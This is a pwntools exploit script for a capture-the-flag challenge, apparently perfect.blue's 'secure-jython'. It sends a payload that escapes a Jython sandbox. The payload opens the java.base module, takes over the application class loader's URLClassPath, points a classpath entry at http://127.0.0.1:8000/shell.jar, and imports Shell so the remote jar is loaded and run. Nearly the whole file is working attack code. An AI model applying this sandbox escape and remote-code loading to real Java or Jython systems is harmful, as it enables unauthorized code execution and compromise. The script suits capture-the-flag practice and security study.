#!/usr/bin/env python

from pwn import *

lines = """
# open all packages
import java
f = &1.value
field_ref = f.__class__
mod = &1.value
mod.self = field_ref
mod.member = java.lang.Class.module

boot_layer = &1.value
boot_layer.self = java.lang.System
boot_layer.member = java.lang.System.bootLayer
module_base = (*boot_layer).nameToModule["java.base"]
*mod = module_base

# get an instance of URLClassPath
import jdk
f.self = jdk.internal.loader.ClassLoaders
f.member = jdk.internal.loader.ClassLoaders.APP_LOADER
app = *f
f.self = app
f.member = jdk.internal.loader.BuiltinClassLoader.ucp
ucp = *f

# add an URL to classpath
jar_url = ucp.path[0]
# http://127.0.0.1:8000/shell.jar
jar_url.protocol = "http"
jar_url.authority = "127.0.0.1:8000"
jar_url.path  = "/shell.jar"
ucp.unopenedUrls.elements[0] = jar_url
ucp.unopenedUrls.head = 0

# trigger
import Shell
""".strip()

def main():
    if args.REMOTE:
        io = remote('secure-jython.chal.perfect.blue', 1337)
    else:
        io = process('./jython')
    io.sendline(lines)
    io.interactive()

if __name__ == '__main__':
    main()
